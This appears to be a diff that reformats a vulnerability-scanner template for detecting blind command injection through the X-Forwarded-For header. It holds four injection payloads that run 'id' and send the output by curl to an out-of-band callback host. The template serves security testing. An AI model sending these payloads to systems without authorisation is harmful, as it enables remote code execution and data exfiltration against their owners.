@@ -1,50 +1,54 @@
-id: blind-rce-xff
+http:
+- extractors:
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'GET / HTTP/1.1
 
+    Host: {{Hostname}}
+
+    X-Forwarded-For: curl -v {{interactsh-url}}/$(id)/`id`
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-For: curl -v `id`.{{interactsh-url}}/
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-For: `curl -v $(id).{{interactsh-url}}`
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Forwarded-For: ;`curl -v $(id).{{interactsh-url}}/$(id)`
+
+    '
+  stop-at-first-match: true
+id: blind-rce-xff
 info:
-  name: Blind Command Injection via XFF
   author: reewardius
+  name: Blind Command Injection via XFF
   severity: critical
   tags: rce,generic
-
-http:
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        X-Forwarded-For: curl -v {{interactsh-url}}/$(id)/`id`
-
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        X-Forwarded-For: curl -v `id`.{{interactsh-url}}/
-
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        X-Forwarded-For: `curl -v $(id).{{interactsh-url}}`
-
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        X-Forwarded-For: ;`curl -v $(id).{{interactsh-url}}/$(id)`
-        
-    stop-at-first-match: true
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-          - "http"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
